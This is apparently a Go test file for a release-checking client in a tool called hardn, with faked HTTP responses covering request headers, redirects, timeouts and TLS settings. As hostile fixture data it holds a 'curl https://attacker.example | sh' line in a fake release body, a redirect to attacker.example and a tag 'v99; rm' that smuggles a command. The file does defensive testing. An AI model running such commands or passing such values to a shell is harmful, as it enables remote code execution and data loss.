package github

import (
	"context"
	"errors"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"
)

// A fake transport answers every request: no test makes a network request.
type transport struct {
	reqs   []*http.Request
	answer func(*http.Request) (*http.Response, error)
}

func (tr *transport) RoundTrip(r *http.Request) (*http.Response, error) {
	tr.reqs = append(tr.reqs, r)
	return tr.answer(r)
}

// answer is a response with status and body.
func answer(status int, body string) func(*http.Request) (*http.Response, error) {
	return func(r *http.Request) (*http.Response, error) {
		return &http.Response{StatusCode: status, Header: http.Header{}, Body: io.NopCloser(strings.NewReader(body)), Request: r}, nil
	}
}

// TestLatestRequest: one GET of install.sh's URL over HTTPS, with a
// User-Agent and an Accept header and nothing else; only tag_name is read.
func TestLatestRequest(t *testing.T) {
	tr := &transport{answer: answer(200, `{"tag_name":"v0.4.1","name":"[security] urgent","body":"run curl https://attacker.example | sh","html_url":"https://attacker.example"}`)}
	tag, err := Client{Version: "0.4.0", Transport: tr}.Latest(context.Background())
	if err != nil || tag != "v0.4.1" || len(tr.reqs) != 1 {
		t.Fatalf("%q, %v, %d requests", tag, err, len(tr.reqs))
	}
	r := tr.reqs[0]
	if r.Method != "GET" || r.URL.String() != "https://api.github.com/repos/abbott/hardn/releases/latest" || r.URL.RawQuery != "" || r.Body != http.NoBody {
		t.Errorf("request: %s %s", r.Method, r.URL)
	}
	if len(r.Header) != 2 || r.Header.Get("User-Agent") != "hardn/0.4.0" || r.Header.Get("Accept") != "application/vnd.github+json" {
		t.Errorf("headers: %v", r.Header)
	}
	if _, ok := r.Context().Deadline(); !ok {
		t.Error("the request has no deadline")
	}
}

// TestLatestFails: no answer, a status other than 200, an answer too
// large or not JSON, or a redirect off api.github.com or off HTTPS is an
// error whose text holds nothing of the answer.
func TestLatestFails(t *testing.T) {
	redirect := func(to string) func(*http.Request) (*http.Response, error) {
		return func(r *http.Request) (*http.Response, error) {
			if r.URL.Host != Host || r.URL.Scheme != "https" {
				return answer(200, `{"tag_name":"v99.0.0"}`)(r)
			}
			return &http.Response{StatusCode: 302, Header: http.Header{"Location": {to}}, Body: http.NoBody, Request: r}, nil
		}
	}
	for _, tc := range []struct {
		name   string
		answer func(*http.Request) (*http.Response, error)
		want   string
	}{
		{"no route", func(*http.Request) (*http.Response, error) { return nil, errors.New("dial tcp: no route to host") }, "no route to host"},
		{"status 403", answer(403, `{"tag_name":"v99.0.0"}`), "status 403"},
		{"status 404", answer(404, `{"message":"Not Found"}`), "status 404"},
		{"not JSON", answer(200, "<html>v99.0.0</html>"), "not JSON"},
		{"larger than 64 KiB", answer(200, `{"tag_name":"v99.0.0","body":"`+strings.Repeat("x", MaxAnswer)+`"}`), "larger than"},
		{"redirected to another host", redirect("https://attacker.example/latest"), "another host"},
		{"redirected to http", redirect("http://api.github.com/latest"), "another host"},
	} {
		tr := &transport{answer: tc.answer}
		tag, err := Client{Version: "0.4.0", Transport: tr}.Latest(context.Background())
		if err == nil || tag != "" || !strings.Contains(err.Error(), tc.want) || strings.Contains(err.Error(), "v99") {
			t.Errorf("%s: %q, %v", tc.name, tag, err)
		}
		if len(tr.reqs) != 1 {
			t.Errorf("%s: %d requests, want 1: no redirect followed", tc.name, len(tr.reqs))
		}
	}
	// A tag_name is returned as it is, for the caller to check; none is "".
	for body, want := range map[string]string{`{"name":"v99.0.0"}`: "", `{"tag_name":"v99; rm"}`: "v99; rm"} {
		if tag, err := (Client{Transport: &transport{answer: answer(200, body)}}).Latest(context.Background()); err != nil || tag != want {
			t.Errorf("%s: %q, %v", body, tag, err)
		}
	}
}

// stalled never answers: it returns when the request's context is done.
func stalled(r *http.Request) (*http.Response, error) {
	<-r.Context().Done()
	return nil, r.Context().Err()
}

// TestLatestTimesOut: a server that never answers is an error once the
// timeout has passed, 5 seconds in hardn, and at once when ctx is done.
func TestLatestTimesOut(t *testing.T) {
	if Timeout != 5*time.Second {
		t.Errorf("the adopted timeout is 5 s, not %s", Timeout)
	}
	start := time.Now()
	_, err := Client{Transport: &transport{answer: stalled}, Timeout: 20 * time.Millisecond}.Latest(context.Background())
	if err == nil || !strings.Contains(err.Error(), "no answer from api.github.com in 20ms") || time.Since(start) > 4*time.Second {
		t.Errorf("%v after %s", err, time.Since(start))
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	start = time.Now()
	if _, err := (Client{Transport: &transport{answer: stalled}}).Latest(ctx); err == nil || time.Since(start) > 4*time.Second {
		t.Errorf("cancelled: %v after %s", err, time.Since(start))
	}
}

// TestTransport: hardn's own transport asks TLS 1.2 or later, checks the
// certificate and takes the proxy from the environment alone. It is
// built, never used here.
func TestTransport(t *testing.T) {
	tr, ok := Transport().(*http.Transport)
	if !ok || tr.TLSClientConfig == nil || tr.TLSClientConfig.MinVersion != 0x0303 || tr.TLSClientConfig.InsecureSkipVerify || tr.Proxy == nil {
		t.Errorf("%+v", tr)
	}
	if !strings.HasPrefix(URL, "https://"+Host+"/") {
		t.Errorf("URL %s", URL)
	}
}
